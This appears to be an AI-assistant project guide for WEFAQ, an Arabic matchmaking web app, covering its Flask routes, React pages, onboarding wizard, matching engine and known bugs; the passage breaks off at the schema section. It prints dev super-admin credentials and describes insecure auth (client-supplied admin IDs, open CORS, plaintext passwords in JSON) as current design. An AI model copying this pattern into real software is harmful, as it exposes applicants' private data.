---
name: wefaq-project-library
description: >-
  Complete technical knowledge base for the WEFAQ (وِفاق) matchmaking platform.
  Use when working on this repo: backend Flask APIs, React frontend, database
  models, onboarding flow, admin panel, JSON sync, or any feature change.
  Gives an AI full awareness of every file, its role, and implementation logic.
---

# WEFAQ (وِفاق) — Full Project Library for AI Assistants

This document is the **authoritative technical map** of the WEFAQ codebase.
If you are an AI (ChatGPT, Cursor, Claude, etc.), treat this as your system
manual: architecture, every file’s role, business rules, and how pieces connect.

---

## 1. What the product is

**WEFAQ** is a respectful Islamic matchmaking platform (Arabic UI, RTL).

- Applicants do **not** self-register freely in production UX.
- An **admin generates a user code**; the applicant logs in with that code.
- On **first login**, the applicant works through a **dynamic, one-question-at-a-time onboarding wizard** (driven by `questions.json`'s `onboarding` config) covering personal data, an extended profile, and open essays → submit.
- After submit, status becomes `reviewing`; the user dashboard shows full application details.
- Admins review applications, change status, leave notes (internal or visible to the user), assign/reassign cases, and get **AI-free compatibility match suggestions** (rule-based scoring engine) for each applicant.
- A **Super Admin** manages other admins; creating/deleting admins syncs `admins.json`.

**Stack**
- Backend: Python 3, Flask, Flask-SQLAlchemy, Flask-CORS, SQLite, Werkzeug password hashing
- Frontend: React 18, React Router 6, Vite 5, Tailwind CSS 3
- Aux data: JSON files under `backend/data/` (seed + sync mirrors)

**Default ports**
- API: `http://localhost:5000` (prefix `/api`)
- UI: `http://localhost:5173`

**Default Super Admin (dev only)**
- Email: `super@wefaq.com`
- Password: `SuperAdmin@2026`
- Seeded from `backend/data/admins.json` on first app start if missing in DB

---

## 2. High-level architecture

```
Browser (React)
    │  fetch JSON / multipart
    ▼
frontend/src/services/*  →  config.apiBaseUrl = http://localhost:5000/api
    │
    ▼
Flask Blueprints (auth / user / admin / notifications / matching)
    │
    ├── security.py auth/authorization decorators + input sanitation
    ├── SQLAlchemy models → SQLite (backend/instance/wefaq.db)
    ├── services/matching_service.py → read-only compatibility scoring
    ├── utils sync helpers → backend/data/*.json
    └── uploads → backend/uploads/ (served at GET /uploads/<filename>)
```

**Auth model (current):** no JWT/session server-side. Frontend stores:
- `localStorage.wefaq_user` after user login
- `localStorage.wefaq_admin` after admin login

Every subsequent request is expected to carry `X-Admin-Id` (admin actions) or `X-User-Code` (user actions) headers — built by `buildAuthHeaders()` in `frontend/src/services/api.js` — and/or `admin_id` in the query/body. `backend/security.py` centralizes the server-side checks: `admin_required` / `super_admin_required` decorators, `get_active_admin`, `get_active_super_admin`, `get_user_by_code`, `can_read_user`, `require_user_self`, `can_access_notification`. Only the newer `matching_routes.py` endpoints actually use the `@admin_required` decorator; the older `admin_routes.py`/`user_routes.py` endpoints mostly do their own inline `admin_id`-in-body checks (see §9 gotchas — the two patterns coexist).

---

## 3. Core domain concepts & business rules

### User statuses
`pending` → `reviewing` → `approved` | `rejected`

- Admin-generated code user starts as `pending` with optional/default name.
- Completing application (`POST /users/<id>/complete` or answers save) sets `reviewing`.
- Admin status change creates a `Notification` for the user.

### Placeholder name
Constant `DEFAULT_USER_NAME = 'متقدم جديد'` in `config.py`.

- Used when generating a code with empty `full_name`.
- Treated as **not a real name**: `is_placeholder_name()` / `user_needs_onboarding()`.
- UI shows it as **placeholder text**, not as a filled value the user must clear.

### Onboarding detection (`user_needs_onboarding`, in `utils.py`)
Returns `true` if **any** of:
- Real name missing/placeholder, or `birthday`, `gender`, `country` missing on `User`
- The linked `UserProfile.details` JSON is missing any of: `nationality`, `profession`, `marital_status`, `marriage_timeline`, `height`, `weight`
- No `OpenAnswer` row, or any of `q1`–`q4` is empty

Returned on login and `GET /users/<id>` as `needs_onboarding`. Note this function **no longer checks `MCQAnswer`** — the extended profile (`UserProfile.details`) and open essays are now the gating fields; MCQ answers can be filled or empty without affecting onboarding status.

### Dynamic onboarding wizard (`questions.json` → `onboarding`)
`backend/data/questions.json` has an `onboarding` object driving `CompleteApplicationPage.jsx` as a single-question-per-screen flow (Typeform-style):
- `onboarding.ui`: Arabic microcopy (`continue`, `submit`, `back`, `validation_error`, etc.)
- `onboarding.other_option`: label for a free-text "other" choice in search fields
- `onboarding.steps[]`: ordered array of question definitions, each with `key`, `type` (`gender` / `text` / `date` / `search` / `choice` / `chips` / `number` / `textarea` / `preferences`), `title`, `required`, optional `options`, optional `storage: "personal"` (writes directly to a `User` column — `full_name`, `birthday`, `gender`, `country`) or otherwise stored under `UserProfile.details[key]`
- `show_if`: conditional display (e.g. `graduation_date` only if `profession == "طالب"`; `kids_count` only if previously married **and** has children)
- A `preferences`-type step holds nested `fields[]` (range sliders, chips, search) for the applicant's partner-preference ranges (age/height min-max, marital preference, nationality preference) — all stored in `UserProfile.details`, **not** used by the matching engine yet (matching reads `MCQAnswer`/`OpenAnswer`, not preference ranges)
- After all `onboarding.steps`, the wizard appends one `textarea` step per entry in `questions.json`'s `open` array (→ `OpenAnswer.q1`–`q4`)
- Submit calls `completeApplication(userId, { ...personal, profile_details: details }, {}, answers)` — **note the MCQ payload is hardcoded to `{}`** in this flow, so users who go through `/complete-application` never set `MCQAnswer` rows (see §9)

### First-time code flow
1. Admin: `POST /admin/users/generate-code`
2. User: `POST /auth/user-login` → `needs_onboarding: true`
3. Frontend navigates to `/complete-application`
4. User steps through the dynamic wizard; `POST /users/<id>/complete` with `{ personal: {...+profile_details}, mcq: {}, open }`
5. Frontend navigates to `/dashboard` with full details

### Legacy/self-register flow (`/register`)
`RegisterPage.jsx` is a separate, older 4-step wizard (personal fields from `config.json.personalFields` + photo upload + `config.json.mcq/open` questions from `questions.json`'s flat `mcq`/`open` arrays) that calls `POST /users/register` then `POST /users/<id>/answers`. It **does fill `MCQAnswer`** but never creates a `UserProfile` row, so a user who registers this way will still show `needs_onboarding: true` afterward (until they separately complete the extended profile). Not linked from the homepage CTA; reachable only via direct `/register` URL.

### Notes visibility
`AdminNote.is_visible_to_user`:
- `false` = internal (admin only)
- `true` = shown on user dashboard via `visible_notes` in `GET /users/<id>`

### Super Admin powers
- `GET /admin/admins?admin_id=` (full admin list)
- `DELETE /admin/admins/<id>` — cannot delete self or another super admin
- Create admin via `POST /admin/create` (also syncs JSON)

### Admin powers (any active admin)
- `DELETE /admin/users/<id>` — delete applicant users
- `PUT /admin/users/<id>/status`, add notes, reassign own cases
- `GET /admin/users/<id>/matches`, `GET /admin/matches/pair` — compatibility scoring (read-only)

### Compatibility matching (admin-facing, not user-facing)
`backend/services/matching_service.py` scores any two opposite-gender users 0–100 across three stages (see §12.8 for the full breakdown): eligibility (gender/country/age, 30 pts, gender+country are mandatory gates), MCQ similarity (40 pts, needs both users' `MCQAnswer` filled), open-essay keyword overlap (30 pts, always flagged for manual review). Exposed via `matching_routes.py` and surfaced in `AdminDashboardPage.jsx`'s applicant detail panel as an expandable "المطابقات المقترحة" (suggested matches) list. Because the primary onboarding wizard no longer fills `MCQAnswer` (see above), the MCQ stage will show `0/40` for most current users unless an admin/user separately populates it via `/register` or `POST /users/<id>/answers`.

---

## 4. Database schema (SQLAlchemy)

See **§12 Full Database & Data Storage Reference** at the end of this document for the complete, column-by-column schema (including the `user_profiles` table, JSON mirror shapes, file uploads, and auth model). Quick summary of tables: `users`, `user_profiles`, `mcq_answers`, `open_answers`, `admins`, `admin_notes`, `notifications`, `activity_logs`.

**Schema changes in development:** delete `backend/instance/wefaq.db` and restart; `db.create_all()` recreates tables; Super Admin is re-seeded from `admins.json`; users missing from DB are re-seeded from `users.json` (matched by unique `code`).

---

## 5. Backend file library

### `backend/app.py`
- Factory `create_app()`: config, CORS (`/api/*`, registered **twice** — see §9), `db.init_app`, `register_routes` (now 5 blueprints), a static `GET /uploads/<filename>` route via `send_from_directory(UPLOAD_DIR, ...)`, `db.create_all()`, `seed_super_admin()`, `seed_users_from_json()`.
- `seed_super_admin()`: reads `admins.json` → `super_admin`; creates Admin with hashed password if email not in DB.
- `seed_users_from_json()`: reads `users.json`; for each entry whose `code` is not already in DB, inserts User (parsing `birthday`/`created_at` via `_parse_seed_date`/`_parse_seed_datetime`) and optional nested `mcq_answers` / `open_answers` if present. Does not duplicate or overwrite existing rows.
- **Persistence:** `wefaq.db` lives at `backend/instance/wefaq.db` and **persists across restarts** — `create_all()` only creates missing tables; it does not drop or recreate the file. If the DB file is deleted manually, both seed functions repopulate from JSON mirrors on next start.
- **Sync audit:** all user write paths call `sync_user_to_json`: `POST /admin/users/generate-code`, `POST /users/register`, `POST /users/<id>/complete`, `POST /users/<id>/answers`, `PUT /users/<id>`, `PUT /admin/users/<id>/status`, `PUT /admin/users/<id>/assign`.
- `__main__`: `test_json_loading()` printout, then `app.run(debug=True)`.

### `backend/config.py`
- Paths: `BASE_DIR`, `DATA_DIR`, `INSTANCE_DIR`, `UPLOAD_DIR` (each overridable via `WEFAQ_DATA_DIR`/`WEFAQ_INSTANCE_DIR`/`WEFAQ_UPLOAD_DIR` env vars; all created with `os.makedirs`).
- `LOGS_DIR` / `SYSTEM_LOG_FILE` — plain-text system log, separate from the DB `activity_logs` table.
- `ALLOWED_PHOTO_EXTENSIONS = {jpg, jpeg, png, webp}`.
- `SQLALCHEMY_DATABASE_URI` → SQLite file `instance/wefaq.db`.
- `SECRET_KEY` (dev placeholder).
- `CORS_ORIGINS` (env `WEFAQ_CORS_ORIGINS`, default `*`), `TESTING` (env `WEFAQ_TESTING`).
- `DEFAULT_USER_NAME = 'متقدم جديد'`.

### `backend/models.py`
- All ORM tables — see §12 for full column detail, including `UserProfile` (1:1 with `User`, JSON `details` column) which is not covered by the old schema table.

### `backend/security.py`
- `EMAIL_RE`, length caps (`MAX_NAME_LEN`, `MAX_PHONE_LEN`, `MAX_EMAIL_LEN`, `MAX_NOTE_LEN`, `MAX_TEXT_LEN`, `MIN_ADMIN_PASSWORD_LEN=8`).
- Request-credential extraction: `_admin_id_from_request()` (header `X-Admin-Id` → query `admin_id` → JSON body `admin_id`), `get_user_code_from_request()` (header `X-User-Code` → JSON body `code`).
- Lookups: `get_active_admin`, `get_active_super_admin`, `get_user_by_code`.
- Decorators: `admin_required`, `super_admin_required` (used only by `matching_routes.py` currently).
- Authorization helpers: `can_read_user(user_id)`, `require_user_self(user_id)`, `can_access_notification(notification)`.
- Sanitation: `sanitize_text`, `validate_email`, `validate_admin_password`.

### `backend/utils.py`
- JSON IO: `read_json_file` / `write_json_file` (UTF-8, `ensure_ascii=False`).
- Loaders: `load_admins`, `load_questions`, `load_users`.
- Passwords: `hash_password` / `verify_password` (Werkzeug).
- Photos: `photo_url_for(photo_path)` (builds absolute URL from `WEFAQ_PUBLIC_BASE_URL` env var or the current request's host), `save_user_photo(file_storage)` (validates extension against `ALLOWED_PHOTO_EXTENSIONS`, saves as `{uuid4().hex}.{ext}` under `UPLOAD_DIR`).
- `generate_user_code(User)` → next unique `USER###` from **highest existing number** (not row count; avoids collisions after deletes).
- `is_placeholder_name`, `user_needs_onboarding(user, mcq_answer=None)` (see §3 for current logic — reads `UserProfile` + `OpenAnswer`, not `MCQAnswer`).
- User JSON sync: `sync_user_to_json`, `remove_user_from_json`.
- Activity logging: `log_activity(admin_id, user_id, action_type, details)` — adds an `ActivityLog` DB row **and** appends a line to `SYSTEM_LOG_FILE` via `_append_system_log`; caller still owns `db.session.commit()`.
- Admin JSON sync: `_normalize_admins_file` (strips any legacy `code` on super_admin), `sync_admin_to_json(admin, plain_password=...)`, `remove_admin_from_json(email)`.
  - Super admin lives under key `super_admin`.
  - Regular admins in array `admins` with plaintext password stored **only at create time** (mirror of seed style; not production-safe).

### `backend/services/matching_service.py`
Pure functions, no DB writes — see §3 and §12.8. Key exports: `compute_age`, `confidence_label`, `score_eligibility`, `score_mcq_similarity`, `score_open_similarity`, `score_pair`, `find_matches_for_user`, `_candidate_summary`.

### `backend/routes/__init__.py`
- Imports blueprints; `register_routes(app)` registers **five**: `auth_bp`, `user_bp`, `admin_bp`, `notification_bp`, `matching_bp`.

### `backend/routes/auth_routes.py` — prefix `/api/auth`
- `POST /user-login`: body `{ code }` → user payload (`id`, `code`, `full_name`, `status`, `needs_onboarding`, `photo_url`).
- `POST /admin-login`: body `{ email, password }` → admin payload including `is_super_admin`; rejects inactive.

### `backend/routes/user_routes.py` — prefix `/api`
- `GET /questions`: full `questions.json` (`mcq`, `open`, `onboarding`).
- `POST /users/register`: accepts JSON **or** `multipart/form-data` (photo upload via `_parse_registration_data`); rejects placeholder name; validates email format and sanitizes text fields; saves photo via `save_user_photo`.
- `POST /users/<id>/answers`: upsert MCQ/Open (`_upsert_answers`); set status `reviewing`; sync JSON.
- `POST /users/<id>/complete`: **primary first-login completion**, used by the dynamic wizard. Body `{ personal: {...+profile_details}, mcq, open }`. Validates personal fields + `profile_details` (nationality/profession/marital_status/marriage_timeline/height/weight) via `_apply_personal_data`, requires all 4 open answers, upserts `MCQAnswer`/`OpenAnswer`, sets `reviewing`, returns user + `mcq_answers` + `profile_details` + `open_answers` with `needs_onboarding: false`.
- `GET /users/<id>`: profile + `mcq_answers` + `profile_details` + `open_answers` + `visible_notes` + `needs_onboarding`.
- `PUT /users/<id>`: update personal fields (`full_name`, `phone`, `email`, `gender`, `country`, `guardian_phone`, `guardian_relation`); reject placeholder name for `full_name`.
- Helpers: `_parse_birthday`, `_apply_personal_data` (also upserts `UserProfile.details`), `_upsert_answers`, `_parse_registration_data`, `_user_payload`.
- **Known bug** (see §9): `register_user` calls `validate_email`/`sanitize_text` which are not imported in this module, and contains leftover duplicate logic from an earlier version — will raise `NameError` on this route unless fixed.

### `backend/routes/admin_routes.py` — prefix `/api/admin`
- `GET /users`: list users; filters: `status`, `scope=all|mine`, `requesting_admin_id`, `assigned_admin_id`, `education` (mcq q1), `financial` (mcq q2); returns `photo_url` (added) plus prior fields, but **not** `assigned_admin_name` on the list endpoint (only on `_user_list_item`, used by `/assign`'s response).
- `PUT /users/<id>/status`: set status + optional reason; body includes `admin_id`; creates user notification + activity log; syncs JSON.
- `POST/GET /users/<id>/notes`: add note with `is_visible_to_user`; list notes with `admin_name`; POST logs `note_added` (visibility flag only, not note text).
- `PUT /users/<id>/assign`: body `{ admin_id, target_admin_id }`; only super admin or current `assigned_admin_id` may reassign; validates target admin is active; logs assignment; syncs JSON; returns updated `_user_list_item`.
- `GET /logs?admin_id=&filter_admin_id=&user_id=&date_from=&date_to=`: activity log for any active admin; newest first; includes `admin_name`, `user_name`.
- `POST /create`: create non-super admin (requires `admin_id` of super admin); `sync_admin_to_json`; logs `admin_created`.
- `GET /admins?admin_id=`: active admin required; super admin gets full list (with `is_active`); others get `{ id, full_name }` only (for assignment dropdown).
- `DELETE /users/<id>`: any active admin; logs `user_deleted` with code/name before delete; `remove_user_from_json`.
- `DELETE /admins/<id>`: Super Admin; block self/super; logs `admin_deleted`; `remove_admin_from_json`.
- `POST /users/generate-code`: optional `full_name`, `admin_id` → sets `assigned_admin_id` to creator and logs auto-assignment; wraps insert in `try/except IntegrityError` → 409 on code collision; syncs JSON.
- `_require_super_admin(admin_id)` / `_require_active_admin(admin_id)` helpers — **note**: these duplicate `security.py`'s `get_active_admin`/`get_active_super_admin` rather than reusing them (only `matching_routes.py` uses the `security.py` decorators).

### `backend/routes/matching_routes.py` — prefix `/api/admin`
- `GET /users/<id>/matches` (`@admin_required`): ranked opposite-gender matches for one user. Query params: `status` (comma-separated, default `approved,reviewing`), `min_score`, `limit` (1–100, default 20), `include_ineligible`.
- `GET /matches/pair` (`@admin_required`): full score breakdown for two specific users (`user_a`, `user_b` query params).

### `backend/routes/notification_routes.py` — prefix `/api/notifications`
- `GET /user/<id>`: list notifications newest first.
- `PUT /<id>/read`: mark read.

### `backend/data/admins.json`
```json
{
  "super_admin": { "full_name", "phone", "email", "city", "password" },
  "admins": [ { "full_name", "phone", "email", "city", "password" } ]
}
```
No admin login `code` field.

### `backend/data/questions.json`
- `mcq`: array of `{ id, question, options[] }` (ids 1–4 map to `q1`–`q4`) — used by the legacy `/register` flow and by the matching engine.
- `open`: array of 4 question strings (index+1 → `q1`–`q4`) — used by both onboarding flows.
- `onboarding`: `{ ui, other_option, steps[] }` driving the dynamic wizard (see §3).

### `backend/data/users.json`
- Mirror list of users for convenience/backup sync; source of truth for runtime is SQLite. Does not carry `UserProfile.details` (see §12.4).

### `backend/instance/wefaq.db`
- Runtime SQLite DB (gitignored typically).

### `backend/uploads/`
- Applicant photo files, random UUID-hex filenames; served publicly at `GET /uploads/<filename>`.

### `backend/test_system.py`
- Standalone integration test suite (`python backend/test_system.py`), runs against an isolated temp `WEFAQ_DATA_DIR`/`WEFAQ_INSTANCE_DIR` (copies `admins.json`/`questions.json`, starts with an empty `users.json`) so it never touches the real DB/JSON files. Exit code 0 = all passed.

### `backend/requirements.txt` and root `requirements.txt`
- Should list: Flask, Flask-CORS, Flask-SQLAlchemy, Werkzeug (explicit for password helpers).

---

## 6. Frontend file library

### Entry & config
| File | Role |
|------|------|
| `frontend/index.html` | HTML shell; mounts `#root` |
| `frontend/src/main.jsx` | `createRoot`, imports `index.css`, renders `<App />` |
| `frontend/src/App.jsx` | `BrowserRouter` + routes (see routing table) |
| `frontend/src/config.json` | `apiBaseUrl`, `registrationSteps`, `personalFields` (used by legacy `/register` + dashboard edit form), `statusLabels` |
| `frontend/src/index.css` | Tajawal/Aref Ruqaa fonts, linen background, mashrabiya utility, focus-visible, reduced-motion |
| `frontend/tailwind.config.js` | Brand colors: linen, ink, muted, teal, gold, brick; display/body fonts; mashrabiya SVG pattern |
| `frontend/vite.config.js` | React plugin; dev server port 5173 |
| `frontend/postcss.config.js` | Tailwind + autoprefixer |
| `frontend/package.json` | scripts: `dev`, `build`, `preview` |

### Routing (`App.jsx`)
| Path | Page | Logic |
|------|------|--------|
| `/` | `HomePage` | Branding; CTA **دخول بالكود** → `/login`; **دخول الإداريين** → `/admin/login` |
| `/login` | `UserLoginPage` | Code login; if `needs_onboarding` → `/complete-application` else `/dashboard` |
| `/complete-application` | `CompleteApplicationPage` | Dynamic one-question-at-a-time wizard for first-time code users, driven by `questions.json.onboarding` |
| `/register` | `RegisterPage` | Legacy/self-register 4-step wizard (personal + photo + flat MCQ/open) — not linked from `HomePage` |
| `/dashboard` | `UserDashboardPage` | If still needs onboarding → redirect complete; else profile + answers + notes |
| `/admin/login` | `AdminLoginPage` | Email/password → store admin → `/admin/dashboard` |
| `/admin/dashboard` | `AdminDashboardPage` | Users, filters, notes, assignment, matches, code gen; Super Admin tab for admins |

### Services
| File | Role |
|------|------|
| `services/api.js` | Shared `fetch` wrapper (`apiGet`/`apiPost`/`apiPut`/`apiDelete`) + `apiPostForm` for multipart; `buildAuthHeaders()` attaches `X-Admin-Id`/`X-User-Code` from localStorage; `buildPhotoUrl(photoPath)` resolves a relative upload path to an absolute URL; throws `Error(message)` on non-OK |
| `services/authService.js` | `loginUser`, `loginAdmin` |
| `services/userService.js` | `getQuestions`, `registerUser` (multipart), `saveAnswers`, `completeApplication`, `getUser`, `updateUser`, `getUserNotifications` |
| `services/adminService.js` | `listUsers` (scope/education/financial filters), `updateUserStatus`, `assignUserCase`, `getActivityLogs`, `addNote`/`getNotes`, `generateUserCode`, `listAdmins`, `deleteUser`/`deleteAdmin`, `createAdmin` |
| `services/matchingService.js` | `getMatchesForUser(userId, {status, minScore, limit, includeIneligible})`, `scoreUserPair(userAId, userBId)` |

### Components
| File | Role |
|------|------|
| `Button.jsx` | Primary/secondary styled button |
| `Card.jsx` | Content panel wrapper |
| `FormField.jsx` | Dynamic field from config (`text`/`select`/`date`/…); used by `RegisterPage` and the `UserDashboardPage` edit form — **not** by `CompleteApplicationPage`, which has its own inline field renderers |
| `ProgressSteps.jsx` | Step circles + connecting progress lines + "step X of N" — used by `RegisterPage` only |
| `StatusBadge.jsx` | Colored label from `config.statusLabels` |
| `NotificationList.jsx` | Renders notification list |
| `Navbar.jsx` | Brand + links to user login |
| `MashrabiyaDivider.jsx` | Decorative mashrabiya band |

### Pages — logic summary

**`HomePage.jsx`**
Marketing hero; two CTAs with distinct routes (user vs admin).

**`UserLoginPage.jsx`**
Posts code; saves `wefaq_user`; branches on `needs_onboarding`.

**`CompleteApplicationPage.jsx`**
Loads session user + `getQuestions()`; if already complete → dashboard.
Builds its step list from `questionSet.onboarding.steps` (filtered by `show_if`) plus one appended `textarea` step per `questionSet.open` entry.
Renders per-question UI inline (`ChoiceCards`, `SearchSelector`, `RangeField` helper components defined in this file) based on each step's `type`.
Fields with `storage: "personal"` write into local `personal` state (→ `User` columns); everything else writes into local `details` state (→ `UserProfile.details`).
Submit → `completeApplication(userId, { ...personal, profile_details: details }, {}, answers)` → dashboard, replacing history with `needs_onboarding: false`.

**`RegisterPage.jsx`**
Separate legacy wizard: personal fields (`config.personalFields`) + optional photo file (client-side extension check + preview) → `registerUser` (multipart) → `saveAnswers` (flat MCQ/open from `questions.json`'s top-level `mcq`/`open` arrays, not `onboarding`). Creates a **new** user/code rather than completing an existing one.

**`UserDashboardPage.jsx`**
Parallel fetch: user, notifications, questions.
Shows timeline (`created_at`, +3 days expected response), editable profile (via `FormField` + `config.personalFields`), visible admin notes, full MCQ/open application details (MCQ section will read empty for users onboarded via the dynamic wizard — see §3).

**`AdminLoginPage.jsx`**
Admin credentials → `wefaq_admin` localStorage.

**`AdminDashboardPage.jsx`**
- Status filter buttons + client-side gender/country/age filters; server-side scope (all/mine/by admin), education, financial filters.
- Generate code: passes `admin_id` → auto-assigns case to creator.
- User table: avatar (`UserAvatar`, falls back to initial letter when no `photo_url`), assignable-admin dropdown inline (editable only for super admin or current case owner via `canAssignUser`), status select, notes link, delete.
- Detail panel (`openUserDetail`): full profile + MCQ/open answers, **plus a "المطابقات المقترحة" (suggested matches) section** — fetches `getMatchesForUser` on open, renders each candidate as an expandable row with total score, eligibility flag, and a per-stage breakdown (eligibility/MCQ/open, with a manual-review hint); clicking a candidate re-opens the detail panel for that candidate.
- Activity log / notes panel: author name, internal vs visible checkbox.
- Super Admin tab: create admin form (passes `admin_id`), list admins, delete with confirm.

---

## 7. End-to-end flows (for implementers)

### A) Generate code → first login → dynamic wizard → dashboard
```
AdminDashboard generateUserCode('')
  → POST /admin/users/generate-code { full_name: "" }
  → User(code, full_name="متقدم جديد", status=pending)

UserLoginPage loginUser(code)
  → needs_onboarding true → /complete-application

CompleteApplicationPage (one question per screen, from questions.json.onboarding.steps + open[])
  → POST /users/:id/complete { personal: {...+profile_details}, mcq: {}, open }
  → UserProfile upserted, OpenAnswer upserted, status reviewing, needs_onboarding false → /dashboard
```

### B) Legacy self-register flow
```
RegisterPage (personal + photo + flat mcq/open questions)
  → POST /users/register (multipart, creates User + optional photo)
  → POST /users/:id/answers (MCQAnswer + OpenAnswer, status reviewing)
  → still needs_onboarding=true until UserProfile is filled separately
```

### C) Admin reviews + matches
```
listUsers → openUserDetail → getMatchesForUser (ranked opposite-gender candidates)
updateUserStatus → Notification created
addNote(..., isVisibleToUser=true) → appears in user visible_notes
assignUserCase → ActivityLog 'assignment' entry
```

### D) Super Admin creates admin
```
POST /admin/create → DB insert + sync_admin_to_json → admins.json admins[] grows
DELETE /admin/admins/:id → DB delete + remove_admin_from_json
```

---

## 8. Design system constraints

When changing UI, **preserve** existing brand tokens:
- Background linen `#FAF8F4`, ink `#22302C`, teal primary `#1F4741`, gold accent `#C9A15A`, brick errors `#B4543A`
- Fonts: display `Aref Ruqaa`, body `Tajawal`
- Rounded-xl inputs/cards; Arabic copy; RTL layout assumed by browser `dir`/CSS

Do not invent a new purple/cream AI-generic theme unless explicitly asked.

---

## 9. Important implementation gotchas

1. **SQLite schema**: `create_all()` does not migrate; delete DB file after model column adds in dev.
2. **Windows console**: Arabic `print` may need `PYTHONIOENCODING=utf-8`.
3. **MCQ key mapping**: question `id` from JSON → answer key `q{id}` (q1…q4).
4. **Open answers**: array index `i` → `q{i+1}`.
5. **User codes**: `generate_user_code` must use max existing `USER###` number, not `query.count()`, or deleted users cause duplicate-code 500 errors on generate.
6. **No server sessions**: never assume auth beyond what frontend sends (`admin_id`, `X-Admin-Id`, `X-User-Code`, user id in URL).
7. **Register vs Complete**: `/register` creates a new code and fills `MCQAnswer` but not `UserProfile`; `/complete-application` fills an **existing** code user's `UserProfile` + `OpenAnswer` but hardcodes `mcq: {}` — the two flows leave different columns populated, and `user_needs_onboarding` and the matching engine's MCQ stage react accordingly. Don't assume both are always filled.
8. **JSON passwords**: stored for seed/sync convenience only — not a security model for production.
9. **CORS**: `app.py` registers CORS on `/api/*` **twice** — once respecting `CORS_ORIGINS`/`allow_headers`, then again unconditionally with `origins: "*"`, so the second call effectively wins and origins are wide open regardless of `WEFAQ_CORS_ORIGINS`.
10. **`frontend/src/services/api.js` auth headers on JSON requests**: `request()` builds a `headers` object with `buildAuthHeaders()` spread in, then immediately overwrites it with a second literal `headers: { 'Content-Type': 'application/json' }` — so `X-Admin-Id`/`X-User-Code` are **not actually sent** on `apiGet`/`apiPost`/`apiPut`/`apiDelete` calls; only `apiPostForm` (used by photo-upload registration) correctly attaches them. Any backend logic relying on `get_active_admin()`/`get_user_by_code()` reading headers (rather than `admin_id`/`code` in the body/query) will not see credentials from most frontend calls.
11. **`user_routes.py` `register_user` bug**: references `validate_email` and `sanitize_text` from `security.py`, but that module is not imported in `user_routes.py` — calling `POST /users/register` as JSON (not multipart) hits this path and will raise `NameError`. The function also has leftover duplicate lines from an earlier version (`data, photo_file = _parse_registration_data()` immediately followed by `data = request.get_json() or {}`, discarding the multipart-parsed `data`). Needs a fix before relying on this endpoint.
12. **Dual authorization patterns**: `admin_routes.py`'s `_require_active_admin`/`_require_super_admin` duplicate `security.py`'s `get_active_admin`/`get_active_super_admin` instead of importing them; only `matching_routes.py` uses the `security.py` decorators (`@admin_required`). Keep this in mind when adding new admin endpoints — prefer `security.py`, but match the file you're editing if doing a small patch.
13. **`user_needs_onboarding` no longer checks MCQ**: it checks `UserProfile.details` completeness + all 4 `OpenAnswer` fields, not `MCQAnswer`. A user can have `needs_onboarding: false` with zero MCQ answers.

---

## 10. How an AI should modify this project

1. Prefer extending existing routes/services/pages over new parallel stacks.
2. Keep Arabic UX strings consistent with current tone.
3. If adding a DB column: update `models.py`, document here (§4/§12), and note DB reset for local SQLite.
4. If adding admin CRUD that should persist outside DB: update `utils` JSON sync.
5. If changing onboarding rules: update `user_needs_onboarding` **and** frontend redirects together, and consider both onboarding flows (`/complete-application` dynamic wizard and legacy `/register`).
6. If changing `questions.json`'s `onboarding.steps`: `CompleteApplicationPage.jsx` renders generically off `type`/`storage`/`show_if`, so most additions need no frontend code — but new `type` values do need a new branch in `renderQuestion()`.
7. After API changes: update matching `*Service.js` and the consuming page.
8. Update this `SKILL.md` when architecture or file roles change — including §12 if the schema changes.

---

## 11. Quick file index (all first-party source)

```
README.md                          Human-facing project overview
SKILL.md                           This AI library (you are here)
requirements.txt                   Python deps (root)
backend/requirements.txt           Same deps for backend-local installs
backend/app.py                     Flask app factory + seed + upload serving
backend/config.py                  Paths, SQLite URI, upload/log dirs, DEFAULT_USER_NAME
backend/models.py                  ORM schema (incl. UserProfile)
backend/security.py                Auth/authorization decorators + input sanitation
backend/utils.py                   Hashing, codes, JSON sync, onboarding helpers, photo I/O
backend/services/matching_service.py  Rule-based compatibility scoring (read-only)
backend/test_system.py             Isolated integration test suite
backend/data/admins.json           Super admin seed + admins list
backend/data/questions.json        MCQ + open question bank + dynamic onboarding config
backend/data/users.json            Synced users mirror
backend/uploads/                   Applicant photo files
backend/routes/__init__.py         Blueprint registration (5 blueprints)
backend/routes/auth_routes.py      User/admin login
backend/routes/user_routes.py      Questions, register, complete, CRUD user
backend/routes/admin_routes.py     Users admin ops, notes, assignment, codes, admins CRUD
backend/routes/matching_routes.py  Compatibility match endpoints (admin-only)
backend/routes/notification_routes.py  User notifications
frontend/src/App.jsx               Routes
frontend/src/main.jsx              React bootstrap
frontend/src/config.json           API URL + legacy form/step config
frontend/src/index.css             Global styles
frontend/src/pages/*               Screens listed above
frontend/src/components/*          Reusable UI
frontend/src/services/*            API clients (incl. matchingService.js)
```

---

*Last aligned with the dynamic one-question-at-a-time onboarding wizard (questions.json `onboarding` config), `UserProfile` extended-profile storage, photo upload support, the rule-based matching/compatibility engine and its admin UI, and `security.py` centralized auth helpers.*

---

## 12. Full Database & Data Storage Reference

This section is the complete, low-level reference for **every place data is stored**, **what type each field is**, and **how the pieces relate** — for both applicant users and admins.

### 12.1 Storage layers overview

WEFAQ persists data across **three separate storage layers**, all under `backend/`:

| Layer | Location | Technology | Role |
|---|---|---|---|
| Primary DB | `backend/instance/wefaq.db` | SQLite (via Flask-SQLAlchemy ORM) | Source of truth at runtime for all users, admins, answers, notes, notifications, logs |
| JSON mirrors | `backend/data/*.json` | Plain JSON files, UTF-8 | Seed data on first boot + human-readable sync mirror on every write; also a soft backup |
| File uploads | `backend/uploads/` | Filesystem, random-named files | Applicant photos (`photo_path` on `User` points here) |
| System log | `backend/instance/logs/system.log` | Plain text file | App-level runtime/system logging (separate from the DB `activity_logs` table) |

Config (`backend/config.py`) resolves these paths, and can be overridden via env vars `WEFAQ_DATA_DIR`, `WEFAQ_INSTANCE_DIR`, `WEFAQ_UPLOAD_DIR`. The SQLite URI is `sqlite:///backend/instance/wefaq.db`.

**Why two copies of user data exist:** SQLite (`wefaq.db`) is authoritative. `backend/data/users.json` and `backend/data/admins.json` are kept in sync on every write (`sync_user_to_json` / `sync_admin_to_json` in `backend/utils.py`) so that (a) the DB can be fully deleted/rebuilt in dev and repopulate itself, and (b) there's a plaintext, diffable snapshot. This is explicitly **not** a production-safe secret-storage pattern — see 12.6.

### 12.2 SQLite schema — full table-by-table field list

All tables defined in `backend/models.py`, using `db = SQLAlchemy()`. Foreign keys enforce relational integrity; cascades are noted per table.

#### `users` — applicant/member accounts (`User` model)
